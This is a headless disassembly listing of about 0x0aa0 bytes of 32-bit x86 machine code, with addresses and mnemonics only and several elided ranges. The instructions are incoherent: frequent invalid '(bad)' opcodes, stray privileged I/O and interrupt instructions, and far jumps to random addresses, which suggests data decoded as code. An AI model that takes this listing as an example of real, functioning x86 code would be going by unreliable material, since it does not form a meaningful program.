  417f96:	sbb    bh,BYTE PTR [ebp+ebp*1-0x6ac88853]
  417f9d:	mov    esi,0x62308c6b
  417fa2:	sbb    DWORD PTR [esi-0xe],esp
  417fa5:	out    dx,al
  417fa6:	inc    edi
  417fa7:	retf   
  417fa8:	inc    eax
  417fa9:	inc    edx
  417faa:	fisttp QWORD PTR [esi+0x7a]
  417fad:	ja     0x417fbe
  417faf:	cld    
  417fb0:	adc    edx,DWORD PTR [eax+0x18]
  417fb3:	push   es
  417fb4:	loop   0x418017
  417fb6:	push   eax
  417fb7:	cdq    
  417fb8:	and    edx,esp
  417fba:	inc    ebp
  417fbb:	dec    esi
  417fbc:	cli    
  417fbd:	fsubr  DWORD PTR [eax]
  417fbf:	call   0xc202:0x9b487a45
  417fc6:	ss retf 0x9e86
  417fca:	popf   
  417fcb:	out    0x6f,eax
  417fcd:	pop    edx
  417fce:	push   0x5
  417fd0:	popa   
  417fd1:	sbb    eax,0x2df6ddaa
  417fd6:	adc    BYTE PTR [edi+esi*4-0x2449e6b9],ah
  417fdd:	repz jnp 0x417fd8
  417fe0:	ficom  DWORD PTR [esp+ecx*8]
  417fe3:	retf   0x735d
  417fe6:	int3   
  417fe7:	add    eax,0x68d96899
  417fec:	sar    BYTE PTR [edi+0x22a2e5ea],1
  417ff2:	pop    ecx
  417ff3:	or     eax,0xef127284
  417ff8:	das    
  417ff9:	arpl   WORD PTR [edx],sp
  417ffb:	cmc    
  417ffc:	std    
  417ffd:	pop    esi
  417ffe:	icebp  
  417fff:	xchg   DWORD PTR [ecx-0x3e1571f],esi
  418005:	shl    DWORD PTR [ecx-0x50343c8a],1
  41800b:	inc    edx
  41800c:	xchg   edi,edx
  41800e:	xchg   ecx,eax
  41800f:	shr    bh,cl
  418011:	das    
  418012:	arpl   si,dx
  418014:	jle    0x41800e
  418016:	outs   dx,BYTE PTR ds:[esi]
  418017:	jle    0xec1ecc0d
  41801d:	sub    bh,ch
  41801f:	xchg   edi,eax
  418020:	dec    eax
  418021:	add    ch,BYTE PTR [esp+ebp*2+0x7b]
  418025:	mov    edi,0x8ef818eb
  41802a:	or     al,0x15
  41802c:	ja     0x41801c
  41802e:	xchg   ebp,eax
  41802f:	inc    ebp
  418030:	xchg   esp,eax
  418031:	das    
  418032:	xchg   esi,eax
  418033:	lahf   
  418034:	dec    esp
	...
  418095:	add    BYTE PTR [ecx-0xba9482],ch
  41809b:	push   ebp
  41809c:	scas   eax,DWORD PTR es:[edi]
  41809d:	dec    BYTE PTR [ecx-0x1a44673c]
  4180a3:	or     ebx,DWORD PTR [ecx+eax*4+0xfc21]
  4180aa:	pop    es
  4180ab:	add    DWORD PTR [eax],eax
  4180ad:	add    BYTE PTR [ebx],bl
  4180af:	inc    ecx
  4180b0:	lds    ebp,FWORD PTR [eax+eax*4-0x25191d5d]
  4180b7:	add    al,0x9b
  4180b9:	sahf   
  4180ba:	leave  
  4180bb:	xchg   esp,eax
  4180bc:	sub    al,0xad
  4180be:	pop    ebp
  4180bf:	push   eax
  4180c0:	cdq    
  4180c1:	(bad)  
  4180c2:	dec    ebx
  4180c3:	jecxz  0x418121
  4180c5:	pop    es
  4180c6:	test   al,0xff
  4180c8:	in     al,dx
  4180c9:	ret    
  4180ca:	aam    0xad
  4180cc:	(bad)  
  4180cd:	xchg   edx,eax
  4180ce:	inc    edx
  4180cf:	xor    ch,ah
  4180d1:	arpl   di,ax
  4180d3:	sub    eax,0xf08c65fa
  4180d8:	scas   al,BYTE PTR es:[edi]
  4180d9:	stc    
  4180da:	ss add al,0xc9
  4180dd:	adc    eax,0xbe13bf33
  4180e2:	dec    cl
  4180e4:	test   BYTE PTR [edx+edi*1],0xf3
  4180e8:	mov    cl,0x13
  4180ea:	push   0xffffff99
  4180ec:	test   eax,0x82c5046b
  4180f1:	cmp    edi,esp
  4180f3:	sbb    eax,0x2e7c8f58
  4180f8:	push   edx
  4180f9:	out    dx,al
  4180fa:	in     eax,dx
  4180fb:	jmp    0xe0e7489c
  418100:	jmp    0x41816f
  418102:	jp     0x41811e
  418104:	pop    esi
  418105:	mov    eax,ds:0x9438408b
  41810a:	cwde   
  41810b:	mov    BYTE PTR [edi+0xb],ah
  41810e:	dec    ecx
  41810f:	imul   edx,DWORD PTR ds:0x19b572ec,0xeb7f4a0c
  418119:	mov    edx,0x18c3336c
  41811e:	jp     0x418170
  418120:	or     ebx,DWORD PTR [eax-0x73fbf38a]
  418126:	das    
  418127:	jbe    0x4180e4
  418129:	sbb    eax,0xde59d516
  41812e:	or     edx,DWORD PTR ds:0xffbc3579
  418134:	(bad)  
  418135:	mov    eax,0xb7547dc4
  41813a:	outs   dx,BYTE PTR ds:[esi]
  41813b:	lods   al,BYTE PTR ds:[esi]
  41813c:	data16 aam 0xb2
  41813f:	add    al,0xc1
  418141:	cld    
  418142:	xchg   BYTE PTR [ecx*4-0x76ba496f],ch
  418149:	iret   
  41814a:	pop    edi
  41814b:	cmc    
  41814c:	bound  eax,QWORD PTR [edi+edx*4-0x4e]
  418150:	push   es
  418151:	out    dx,al
  418152:	(bad)  
  418153:	push   ss
  418154:	and    ah,BYTE PTR [ebx+0x5c179e51]
  41815a:	test   DWORD PTR [ebx*8-0x742ac2b7],esi
  418161:	mov    al,0xc0
  418163:	daa    
  418164:	xchg   BYTE PTR [edx+0x2b1c370a],ch
  41816a:	and    dl,bl
  41816c:	and    BYTE PTR [ebp+0x274e1f16],bh
  418172:	sbb    ebx,DWORD PTR [ebp+0x6d7a4b3c]
  418178:	xchg   ebx,eax
  418179:	cmp    eax,0xbbaf08af
  41817e:	int    0xe5
  418180:	pop    esp
  418181:	xor    BYTE PTR [edi],0x2f
  418184:	add    ch,0x18
  418187:	popf   
  418188:	in     al,0x70
  41818a:	add    cl,dl
  41818c:	js     0x41814c
  41818e:	and    eax,0xd9437d17
  418193:	dec    ebx
  418194:	sub    al,0x5a
  418196:	pop    edx
  418197:	sub    eax,0x74
  41819a:	popa   
  41819b:	enter  0xf2e9,0x6b
  41819f:	repnz hlt 
  4181a1:	jp     0x4181df
  4181a3:	mov    al,0x37
  4181a5:	bnd jo 0x4181ca
  4181a8:	retf   0xc613
  4181ab:	and    BYTE PTR [esp+edx*4],al
  4181ae:	(bad)  
  4181af:	dec    esi
  4181b0:	lea    edx,ds:0xf39e7b
	...
  418216:	aaa    
  418217:	xchg   edx,eax
  418218:	and    al,0x83
  41821a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41821b:	mov    bh,0xb7
  41821d:	mov    dh,0x16
  41821f:	mov    cl,ch
  418221:	(bad)  
  418222:	cmc    
  418223:	pop    esi
  418224:	loop   0x4181d2
  418226:	sub    ch,bh
  418228:	add    BYTE PTR [eax],al
  41822a:	pop    es
  41822b:	add    DWORD PTR [eax],eax
  41822d:	add    dl,ah
  41822f:	das    
  418230:	mov    ebp,0x771f062e
  418235:	jmp    0xb5d707ac
  41823a:	jb     0x418295
  41823c:	int    0xf4
  41823e:	adc    edx,DWORD PTR [eax-0x6f]
  418241:	xor    al,0x91
  418243:	add    bh,0x19
  418246:	jno    0x41821a
  418248:	adc    ecx,DWORD PTR [ebx+0x1014e536]
  41824e:	mov    esi,0x2d4402b9
  418253:	add    DWORD PTR [eax+0x6c],ebx
  418256:	pop    ecx
  418257:	inc    ecx
  418258:	test   eax,0xeae72d03
  41825d:	mov    ?,WORD PTR [esi+edi*4-0x373efc68]
  418264:	cmp    edx,DWORD PTR [edx]
  418266:	call   DWORD PTR [ebx+ebx*2]
  418269:	and    dh,BYTE PTR [esi+0x67]
  41826c:	mov    dh,0xaf
  41826e:	mov    ch,0x1e
  418270:	(bad)  
  418271:	fdivrp st(6),st
  418273:	mov    bl,0x64
  418275:	fsubr  DWORD PTR [ebp-0x3a4fda58]
  41827b:	xlat   BYTE PTR ds:[ebx]
  41827c:	daa    
  41827d:	shr    BYTE PTR [ebp+0x20],1
  418280:	mov    esi,0xa6fcdf97
  418285:	test   eax,0xeab9a14b
  41828a:	call   0x1022:0xd71addd2
  418291:	popf   
  418292:	jnp    0x41821a
  418294:	fisub  WORD PTR [ebp+0x67]
  418297:	pop    ebp
  418298:	cwde   
  418299:	nop
  41829a:	xor    eax,0xb70cced5
  41829f:	out    dx,eax
  4182a0:	lock xchg DWORD PTR [edi+0x20cd48fb],esi
  4182a7:	daa    
  4182a8:	leave  
  4182a9:	dec    esp
  4182aa:	add    al,0x89
  4182ac:	scas   al,BYTE PTR es:[edi]
  4182ad:	scas   eax,DWORD PTR es:[edi]
  4182ae:	repnz pop es
  4182b0:	push   0x8eaab89f
  4182b5:	pmuludq mm5,QWORD PTR [esi]
  4182b8:	push   esp
  4182b9:	(bad)  
  4182ba:	(bad)  
  4182bb:	push   ebx
  4182bc:	imul   ebx,DWORD PTR [esi],0x28
  4182bf:	or     bh,cl
  4182c1:	push   cs
  4182c2:	test   eax,0x3c541507
  4182c7:	data16 or dh,dl
  4182ca:	test   eax,0xc3f742e9
  4182cf:	cmp    BYTE PTR [esi],cl
  4182d1:	fdivr  st,st(3)
  4182d3:	retf   0x7fe0
  4182d6:	fst    QWORD PTR ds:0x4e0d1b7a
  4182dc:	mul    esi
  4182de:	popf   
  4182df:	push   es
  4182e0:	test   DWORD PTR [esi-0x1e],esp
  4182e3:	mov    bh,BYTE PTR [eax-0x53cb5ff7]
  4182e9:	push   edx
  4182ea:	push   ss
  4182eb:	out    0x7a,al
  4182ed:	add    bh,dl
  4182ef:	ffreep st(4)
  4182f1:	mov    ds:0x9105454,eax
  4182f6:	jb     0x4182c1
  4182f8:	xchg   ebx,eax
  4182f9:	mov    ebp,0x626a2356
  4182fe:	mov    al,ds:0xa482092e
  418303:	mov    esp,0xa77f09ac
  418308:	xchg   ebp,eax
  418309:	or     BYTE PTR [edx],ch
  41830b:	jl     0x4182ca
  41830d:	imul   ebx,esi,0x37156165
  418313:	inc    esp
  418314:	adc    DWORD PTR [eax-0x2848c177],ebx
  41831a:	mov    ebp,0xa00d5ba4
  41831f:	adc    eax,0xd255d5db
  418324:	lds    ebp,FWORD PTR [edi-0x5d]
  418327:	hlt    
  418328:	fadd   st(7),st
  41832a:	cmp    al,0xac
  41832c:	or     al,BYTE PTR [esp+ebp*1]
  41832f:	psrlw  mm4,mm1
  418332:	sbb    esi,edi
  418334:	add    BYTE PTR [bx+si],al
	...
  418393:	add    BYTE PTR [eax],al
  418395:	add    ah,bl
  418397:	mov    bl,0x3f
  418399:	push   eax
  41839a:	jg     0x418378
  41839c:	(bad)  
  41839d:	mov    edi,0xc253ee23
  4183a2:	pop    ebx
  4183a3:	mov    fs,WORD PTR [esp+esi*8]
  4183a6:	das    
  4183a7:	inc    BYTE PTR [eax]
  4183a9:	add    BYTE PTR [edi],al
  4183ab:	add    DWORD PTR [eax],eax
  4183ad:	add    BYTE PTR [ecx+eiz*1-0x6230c804],bl
  4183b4:	jecxz  0x418398
  4183b6:	pushf  
  4183b7:	ss cld 
  4183b9:	jmp    0x216e7a58
  4183be:	or     BYTE PTR [edi-0x581cfeaf],cl
  4183c4:	fs test eax,0x8c20f52f
  4183ca:	nop
  4183cb:	mov    bh,0x8
  4183cd:	and    cl,al
  4183cf:	push   ebp
  4183d0:	ja     0x418397
  4183d2:	xchg   BYTE PTR [edi-0x35a76532],ch
  4183d8:	dec    edx
  4183d9:	loope  0x4183c7
  4183db:	mov    bl,ah
  4183dd:	inc    ebp
  4183de:	mov    bh,0xa3
  4183e0:	or     WORD PTR [ebp+0xa],0x7a
  4183e5:	retf   0xd4e3
  4183e8:	jg     0x41838e
  4183ea:	(bad)  
  4183eb:	or     bl,BYTE PTR [edx-0x55]
  4183ee:	sbb    cl,BYTE PTR [edx+0x101cc05d]
  4183f4:	push   ds
  4183f5:	mov    edx,edx
  4183f7:	js     0x418438
  4183f9:	cmp    al,0xb3
  4183fb:	push   es
  4183fc:	ins    DWORD PTR es:[edi],dx
  4183fd:	fst    st(6)
  4183ff:	inc    eax
  418400:	fwait
  418401:	jnp    0x418429
  418403:	mov    al,ds:0xb39ea2b
  418408:	mov    dl,0x9b
  41840a:	pop    ecx
  41840b:	dec    ebx
  41840c:	test   al,0x2d
  41840e:	(bad)  
  41840f:	cld    
  418410:	std    
  418411:	neg    BYTE PTR [eax]
  418413:	xor    BYTE PTR [edi],ah
  418415:	push   ecx
  418416:	mov    ebx,0x2b7f350a
  41841b:	push   eax
  41841c:	(bad)  
  41841d:	mov    ebx,0xb59f240b
  418422:	pop    esi
  418423:	int    0x63
  418425:	xor    ebx,esi
  418427:	dec    ebx
  418428:	mov    al,0x24
  41842a:	shr    BYTE PTR [edi+ebp*1+0xb4d79e6],0x75
  418432:	or     bh,BYTE PTR [ecx+0x16d18cae]
  418438:	push   edx
  418439:	jle    0x418404
  41843b:	adc    esi,ebp
  41843d:	fstp   DWORD PTR [ebp-0xe]
  418440:	mov    al,ds:0x3b4850f1
  418445:	and    BYTE PTR [esi],al
  418447:	sbb    esi,DWORD PTR [edi+0x5c]
  41844a:	xor    eax,0x580fdcd5
  41844f:	(bad)  
  418450:	jo     0x41844d
  418452:	mov    ebp,0xcaaa46a8
  418457:	fdivp  st(3),st
  418459:	sub    ebx,esi
  41845b:	cs mov esi,0xd8b6bf26
  418461:	mov    bl,0x4e
  418463:	test   eax,0x85353056
  418468:	add    DWORD PTR [edx],edx
  41846a:	push   es
  41846b:	push   esi
  41846c:	push   edx
  41846d:	pop    ebp
  41846e:	jl     0x4184ac
  418470:	scas   al,BYTE PTR es:[edi]
  418471:	sub    dl,BYTE PTR [edi-0x3f19f6cb]
  418477:	mov    dl,0x87
  418479:	jno    0x41846f
  41847b:	pop    esp
  41847c:	shr    DWORD PTR [esi-0x73b45b20],0x9e
  418483:	sbb    eax,0x46868755
  418488:	jnp    0x4184ac
  41848a:	cmp    BYTE PTR [ecx-0x2543d5c0],0xd2
  418491:	scas   al,BYTE PTR es:[edi]
  418492:	cwde   
  418493:	outs   dx,BYTE PTR ds:[esi]
  418494:	mov    al,ds:0xbbd77019
  418499:	push   ss
  41849a:	push   eax
  41849b:	retf   0x46f0
  41849e:	std    
  41849f:	fsubr  st,st(1)
  4184a1:	(bad)  
  4184a2:	scas   eax,DWORD PTR es:[edi]
  4184a3:	jns    0x418445
  4184a5:	jg     0x4184b3
  4184a7:	mov    eax,0x1230c8a0
  4184ac:	mov    cl,0x88
  4184ae:	dec    ecx
  4184af:	mov    edi,0xa965308b
  4184b4:	jmp    0x4184b9
	...
  418515:	add    BYTE PTR [ecx-0x7],al
  418518:	mov    ebx,ebx
  41851a:	mov    ebx,0x26fb51fb
  41851f:	xchg   edi,eax
  418520:	mov    ecx,DWORD PTR [edx+edi*1+0x36f44901]
  418527:	inc    DWORD PTR [eax]
  418529:	add    BYTE PTR [edi],al
  41852b:	add    DWORD PTR [eax],eax
  41852d:	add    BYTE PTR [esi-0x5202512e],bl
  418533:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418534:	push   edx
  418535:	and    bh,dl
  418537:	adc    BYTE PTR [ebp+0x70],bh
  41853a:	xor    BYTE PTR [edx],bl
  41853c:	jnp    0x418563
  41853e:	gs pusha 
  418540:	pop    ebp
  418541:	test   ecx,esp
  418543:	inc    ecx
  418544:	(bad)  
  418545:	sti    
  418546:	sub    al,0xe
  418548:	mov    dh,0xf7
  41854a:	ds dec esp
  41854c:	jmp    0x418544
  41854e:	imul   edi,DWORD PTR [edi-0x767fbe87],0xffffffd6
  418555:	xchg   ecx,eax
  418556:	jnp    0x4185be
  418558:	lahf   
  418559:	push   cs
  41855a:	sbb    eax,0xfee745ba
  41855f:	add    al,0x5d
  418561:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418562:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418563:	jno    0x4185be
  418565:	add    ecx,DWORD PTR [ecx+0x6]
  418568:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418569:	push   esp
  41856a:	call   0xe7bace3b
  41856f:	inc    BYTE PTR [ebx-0x78]
  418572:	popa   
  418573:	popa   
  418574:	sub    dh,BYTE PTR [eax-0x67]
  418577:	pusha  
  418578:	rcr    BYTE PTR [edi+0x70],0x2a
  41857c:	(bad)  
  41857d:	outs   dx,BYTE PTR ds:[esi]
  41857e:	jo     0x41851f
  418580:	dec    edx
  418581:	bound  edx,QWORD PTR [ebx+0x71baea3e]
  418587:	popf   
  418588:	xchg   esp,edx
  41858a:	jmp    0xe1a88d89
  41858f:	pop    ebx
  418590:	retf   0x3424
  418593:	jg     0x418605
  418595:	mov    ecx,0x91f2e05
  41859a:	(bad)  
  41859b:	sti    
  41859c:	pop    esp
  41859d:	out    0xf6,al
  41859f:	call   0x2ac21dda
  4185a4:	sar    DWORD PTR [edi],0x8a
  4185a7:	js     0x418597
  4185a9:	mov    ebp,0xe0250a0a
  4185ae:	push   ss
  4185af:	icebp  
  4185b0:	retf   
  4185b1:	mov    ah,BYTE PTR [edi+edi*4+0x3c]
  4185b5:	imul   edx,DWORD PTR [edx+0x2d5711ec],0xffffff87
  4185bc:	aam    0xb2
  4185be:	mov    edi,0xca0f5fe9
  4185c3:	sbb    eax,0x39247979
  4185c8:	push   edi
  4185c9:	pop    ebx
  4185ca:	pushw  es
  4185cc:	sti    
  4185cd:	jae    0x418561
  4185cf:	cli    
  4185d0:	cmc    
  4185d1:	adc    eax,0xda34864
  4185d6:	adc    bh,BYTE PTR [ebp+0x1859db70]
  4185dc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4185dd:	fisttp QWORD PTR [ebp+0x2b]
  4185e0:	mov    ecx,0x4580f29f
  4185e5:	mov    dl,0xcd
  4185e7:	aas    
  4185e8:	and    BYTE PTR ds:0xeb50a2ac,dl
  4185ee:	in     eax,0x2b
  4185f0:	push   0xffffff94
  4185f2:	stos   BYTE PTR es:[edi],al
  4185f3:	int3   
  4185f4:	fcmovne st,st(3)
  4185f6:	mov    esp,0xb8851249
  4185fb:	mov    ds:0x519b5ad4,al
  418600:	mov    bh,0x35
  418602:	repz push ds
  418604:	adc    eax,0xef383076
  418609:	add    cl,ch
  41860b:	(bad)  
  41860c:	mov    ecx,0x7e4b15ab
  418611:	sahf   
  418612:	lock xchg ebp,eax
  418614:	ror    DWORD PTR [eax],cl
  418616:	or     eax,0x6a1d39e7
  41861b:	lahf   
  41861c:	fdivr  QWORD PTR [ebx+0x5ee50646]
  418622:	adc    ebp,DWORD PTR [edi]
  418624:	and    eax,0x61c2cd9a
  418629:	cld    
  41862a:	adc    bh,BYTE PTR [edx+0x4d]
  41862d:	pop    es
  41862e:	scas   al,BYTE PTR es:[edi]
  41862f:	push   ss
  418630:	add    al,0x6
  418632:	or     DWORD PTR [edx],ebp
  418634:	add    BYTE PTR cs:[eax],al
	...
  418693:	add    BYTE PTR [eax],al
  418695:	add    BYTE PTR [ebx-0x44c35fd8],dl
  41869b:	mov    esp,0xba07af9f
  4186a0:	xor    BYTE PTR [esi-0x61c1d51],bh
  4186a6:	cmp    eax,0x7000100
  4186ab:	add    DWORD PTR [eax],eax
  4186ad:	add    BYTE PTR [ebp+ebp*2-0x53a4ae23],ch
  4186b4:	add    al,0x55
  4186b6:	pop    eax
  4186b7:	jb     0x418714
  4186b9:	xchg   ecx,eax
  4186ba:	jge    0x418689
  4186bc:	pop    ebx
  4186bd:	push   ss
  4186be:	call   0x30c3:0x9a851450
  4186c5:	jg     0x418655
  4186c7:	in     eax,dx
  4186c8:	pop    esi
  4186c9:	mov    esp,0x17e4778b
  4186ce:	cmp    cl,BYTE PTR [edx]
  4186d0:	or     al,0xc9
  4186d2:	dec    ebp
  4186d3:	jecxz  0x41872e
  4186d5:	cs xchg ebx,eax
  4186d7:	sub    eax,0xa5da0e19
  4186dc:	int3   
  4186dd:	or     BYTE PTR [esi+0x759a9ae0],bh
  4186e3:	push   cs
  4186e4:	jbe    0x41868a
  4186e6:	pop    ecx
  4186e7:	in     eax,dx
  4186e8:	xchg   cl,bl
  4186ea:	xor    DWORD PTR ds:0x41978802,esp
  4186f0:	mov    ds:0x9eb7b665,eax
  4186f5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4186f6:	pop    es
  4186f7:	(bad)  
  4186f8:	in     al,0x2f
  4186fa:	lahf   
  4186fb:	outs   dx,BYTE PTR ds:[esi]
  4186fc:	jg     0x418779
  4186fe:	test   al,0x21
  418700:	in     eax,dx
  418701:	xchg   esp,eax
  418702:	adc    dl,BYTE PTR [ebx+0x4cb267c6]
  418708:	loopne 0x4186de
  41870a:	pop    ecx
  41870b:	push   ecx
  41870c:	add    dh,0xc1
  41870f:	mov    al,ds:0x5b4a513b
  418714:	dec    edx
  418715:	pusha  
  418716:	mov    al,ds:0xcd740198
  41871b:	push   edx
  41871c:	add    eax,0xcea217df
  418721:	xor    cl,BYTE PTR [ebx+0x7c6a7a0a]
  418727:	in     eax,0x40
  418729:	xchg   esi,eax
  41872a:	test   edi,ebx
  41872c:	stos   BYTE PTR es:[edi],al
  41872d:	pop    ss
  41872e:	dec    eax
  41872f:	dec    edi
  418730:	add    al,0x3a
  418732:	jg     0x41875d
  418734:	cmc    
  418735:	add    al,0x8e
  418737:	shl    DWORD PTR [edx-0x6d],0x8f
  41873b:	scas   eax,DWORD PTR es:[edi]
  41873c:	ja     0x4186e9
  41873e:	add    DWORD PTR [edi],eax
  418740:	pop    esp
  418741:	sti    
  418742:	xor    bl,dl
  418744:	cld    
  418745:	outs   dx,BYTE PTR ds:[esi]
  418746:	fiadd  DWORD PTR [ebx-0x68]
  418749:	cmp    DWORD PTR [ecx],edx
  41874b:	xchg   DWORD PTR [esi-0x7ea4f845],eax
  418751:	dec    ebp
  418752:	sbb    DWORD PTR [ebp+0x37],0xb60156c4
  418759:	push   ds
  41875a:	in     al,dx
  41875b:	repnz push edi
  41875d:	cli    
  41875e:	aad    0xf7
  418760:	popa   
  418761:	retf   0x8b9d
  418764:	sahf   
  418765:	icebp  
  418766:	push   ecx
  418767:	adc    eax,0x1aa7d825
  41876c:	fld    TBYTE PTR [ecx+0x351ab85b]
  418772:	test   BYTE PTR ds:0xf2289c68,ah
  418778:	fadd   st,st(4)
  41877a:	in     al,0xe7
  41877c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41877d:	(bad)  [edx+0x287624e9]
  418783:	mov    ds:0xf6363c10,eax
  418788:	sub    eax,0x965f3ac2
  41878d:	ss cmp al,0xed
  418790:	in     al,dx
  418791:	push   cs
  418792:	jecxz  0x418765
  418794:	and    eax,0x94a0e055
  418799:	and    BYTE PTR [ebx+0x6dbf0fdc],ah
  41879f:	adc    esi,DWORD PTR [eax+0x65687947]
  4187a5:	sbb    DWORD PTR [edx],esp
  4187a7:	int    0xa2
  4187a9:	xor    ebp,ebp
  4187ab:	mov    ds:0xb8a3109a,al
  4187b0:	bound  ecx,QWORD PTR [ecx-0x39]
  4187b3:	popf   
  4187b4:	adc    al,0x0
	...
  418816:	xchg   esp,eax
  418817:	enter  0x4337,0x7f
  41881b:	push   esp
  41881d:	fisttp WORD PTR [eax]
  41881f:	test   eax,0x15f27be5
  418824:	lea    esp,[ebx+0x10144]
  41882a:	pop    es
  41882b:	add    DWORD PTR [eax],eax
  41882d:	add    BYTE PTR [esi],ch
  41882f:	inc    eax
  418830:	jbe    0x418878
  418832:	scas   eax,DWORD PTR es:[edi]
  418833:	mov    DWORD PTR [ebp+0x3a],0x471e04b3
  41883a:	mov    ?,edi
  41883c:	fmul   DWORD PTR [edi+0x585d4ef0]
  418842:	inc    ebp
  418843:	push   esp
  418844:	dec    edx
  418845:	mov    edx,0xdf25fb82
  41884a:	sub    BYTE PTR ds:0xaf80602c,dh
  418850:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418851:	sbb    BYTE PTR [edi],0x8
  418854:	inc    esi
  418855:	test   eax,0x46785d6e
  41885a:	sbb    dl,bh
  41885c:	adc    eax,0xe20d5544
  418861:	jne    0x4188ba
  418863:	fmul   QWORD PTR [edx+ebx*1]
  418866:	shr    BYTE PTR [ebp+0x69],cl
  418869:	and    al,0x7d
  41886b:	ret    0x2e51
  41886e:	pusha  
  41886f:	retf   0x43af
  418872:	je     0x4188d9
  418874:	xchg   ebx,eax
  418875:	fistp  WORD PTR [ebx]
  418877:	mov    ebp,0xdcc4f670
  41887c:	(bad)  
  41887d:	pop    edx
  41887e:	out    0x94,eax
  418880:	mov    esp,0x91edd97a
  418885:	inc    ebp
  418886:	mov    dh,0x45
  418888:	xchg   DWORD PTR [edi+edi*4-0x26],eax
  41888c:	aaa    
  41888d:	dec    edi
  41888e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41888f:	or     DWORD PTR [eax-0x35794e2a],ebp
  418895:	mov    ds:0x9e50383c,al
  41889a:	pop    ds
  41889b:	(bad)  
  41889c:	fdiv   DWORD PTR [edi]
  41889e:	jg     0x4188a4
  4188a0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4188a1:	push   ss
  4188a2:	dec    esi
  4188a3:	sbb    eax,0xe4c2591d
  4188a8:	imul   ecx
  4188aa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4188ab:	jo     0x41889b
  4188ad:	jecxz  0x41887e
  4188af:	xor    ebx,DWORD PTR [ebx+0x66f0aafd]
  4188b5:	pop    edi
  4188b6:	jecxz  0x418920
  4188b8:	(bad)  
  4188b9:	dec    ebx
  4188ba:	add    ecx,DWORD PTR [ecx]
  4188bc:	popf   
  4188bd:	jo     0x418865
  4188bf:	out    dx,al
  4188c0:	jle    0x41886a
  4188c2:	push   0xffffffae
  4188c4:	sahf   
  4188c5:	fistp  DWORD PTR [edi]
  4188c7:	cmp    DWORD PTR [edx+0x557c292e],edi
  4188cd:	jb     0x41889d
  4188cf:	push   es
  4188d0:	add    DWORD PTR [esi+esi*4+0x5d],eax
  4188d4:	jmp    0xdfee:0x3b00cf47
  4188db:	ins    BYTE PTR es:[edi],dx
  4188dc:	pop    ss
  4188dd:	mov    edi,0x25735025
  4188e2:	fadd   st,st(3)
  4188e4:	int3   
  4188e5:	add    eax,0xe30637f6
  4188ea:	in     eax,dx
  4188eb:	sub    eax,0xcf917b98
  4188f0:	lock jmp 0x4188f5
  4188f3:	mov    cl,0x45
  4188f5:	ret    0x690e
  4188f8:	mov    ds,ebp
  4188fa:	div    BYTE PTR [esi]
  4188fc:	inc    edx
  4188fd:	ja     0x41892f
  4188ff:	(bad)  
  418900:	push   eax
  418901:	iret   
  418902:	rol    edx,0x5f
  418905:	push   ebp
  418906:	inc    eax
  418907:	jp     0x4188c7
  418909:	pop    esi
  41890a:	repnz lods eax,DWORD PTR ds:[esi]
  41890d:	cmp    ecx,DWORD PTR ds:0xdbf68a6f
  418913:	ins    DWORD PTR es:[edi],dx
  418914:	shl    cl,1
  418916:	ret    0x5d44
  418919:	sbb    al,0x3b
  41891b:	xchg   ebx,eax
  41891c:	xchg   ecx,eax
  41891d:	mov    ss,WORD PTR [eax]
  41891f:	mov    bh,0x5c
  418921:	pop    ebp
  418922:	in     eax,0xe3
  418924:	in     al,dx
  418925:	clc    
  418926:	inc    edx
  418927:	pop    edi
  418928:	lahf   
  418929:	dec    esp
  41892a:	pusha  
  41892b:	and    al,0xef
  41892d:	xor    cl,BYTE PTR [edx+0x67225de1]
  418933:	mov    ebx,0x57
	...
  418994:	add    BYTE PTR [eax],al
  418996:	mov    WORD PTR [ecx-0x28a2e9ac],ss
  41899c:	into   
  41899d:	fwait
  41899e:	cmc    
  41899f:	pop    edx
  4189a0:	sub    ecx,DWORD PTR [esi+0x2b7fb022]
  4189a6:	dec    ebx
  4189a7:	add    al,BYTE PTR [ecx]
  4189a9:	add    BYTE PTR [edi],al
  4189ab:	add    DWORD PTR [eax],eax
  4189ad:	add    BYTE PTR [esi-0x1c393252],ch
  4189b3:	or     DWORD PTR [esi-0x467d5ca7],esi
  4189b9:	les    ebx,FWORD PTR [edx-0x2bce6bb6]
  4189bf:	dec    ebx
  4189c0:	xor    BYTE PTR [esi+0x6920d1a4],al
  4189c6:	fs imul ebp,ebx,0x72
  4189ca:	mov    eax,ds:0x92ba3c86
  4189cf:	cdq    
  4189d0:	je     0x418a49
  4189d2:	in     eax,dx
  4189d3:	pop    ecx
  4189d4:	lds    eax,FWORD PTR [esi+0x87d1fdb]
  4189da:	sub    eax,DWORD PTR [esi]
  4189dc:	stc    
  4189dd:	push   ebp
  4189de:	test   DWORD PTR [edx+edx*4],ecx
  4189e1:	int3   
  4189e2:	push   esi
  4189e3:	lahf   
  4189e4:	adc    DWORD PTR [esi+0x6],esp
  4189e7:	sar    eax,0x30
  4189ea:	xchg   edi,eax
  4189eb:	mov    ds:0x4a8bcbbf,al
  4189f0:	add    bh,BYTE PTR [ebx+0x691bc217]
  4189f6:	imul   BYTE PTR [edi]
  4189f8:	rol    BYTE PTR [ebp+0x4d7f1669],0x89
  4189ff:	je     0x418a59
  418a01:	sbb    bl,BYTE PTR [esi]
  418a03:	push   cs
  418a04:	(bad)  
  418a05:	jle    0x41899d
  418a07:	push   0x25
  418a09:	jmp    0xc107179d
  418a0e:	xor    ch,cl
  418a10:	push   esp
  418a11:	fild   WORD PTR [edx+0x3fea7ebb]
  418a17:	mov    ch,0x8c
  418a19:	dec    edx
  418a1a:	push   ecx
  418a1b:	(bad)  
  418a1c:	mov    esp,0x6e0f97b6
  418a21:	add    eax,0xc476441b
  418a26:	pop    ds
  418a27:	xor    dh,BYTE PTR [esi+edx*8+0x37ded37e]
  418a2e:	sub    DWORD PTR [ebx+0x29fad476],0xffffffbe
  418a35:	sbb    DWORD PTR [edx+0x25],0x40db859c
  418a3c:	or     ebp,ecx
